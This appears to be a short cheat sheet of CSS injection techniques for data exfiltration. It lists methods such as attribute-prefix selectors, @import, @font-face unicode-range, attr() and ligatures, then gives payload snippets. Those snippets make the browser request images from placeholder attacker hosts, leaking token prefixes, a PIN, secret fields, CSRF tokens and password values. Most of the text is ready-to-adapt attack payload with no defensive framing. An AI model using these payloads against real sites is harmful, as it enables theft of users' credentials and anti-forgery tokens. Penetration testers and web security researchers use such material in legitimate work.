entries.body:
CSS Selectors  attribute selectors ([value^=a]) match a value and load a background-image from your domain -> character leak.
@import        import external styles from your server for blind exfiltration (Blind CSS Exfiltration).
@font-face     unicode-range loads a font only if a specific character is present on the page -> character presence oracle.
attr()         CSS function pulls an attribute value and substitutes it into a URL (image-set).
Ligatures      a custom font with ligatures changes element width -> detection via scrollbar / media query.
Conditionals   if() + CSS variables give logic right inside inline-style without an external stylesheet.

input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}

input[name="pin"][value="1234"] {
  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);
}

div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}

/* a hidden input does not render -> style the first VISIBLE following sibling via + */
input[name="secret"][value^="a"] + * {
  background: url(https://[ATTACKER.DOMAIN.TLD]/leak?c=a)
}

input[name="csrf-token"][value^="a"] + input {
  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)
}

input[name="password"] {
  background: image-set(attr(value))
}
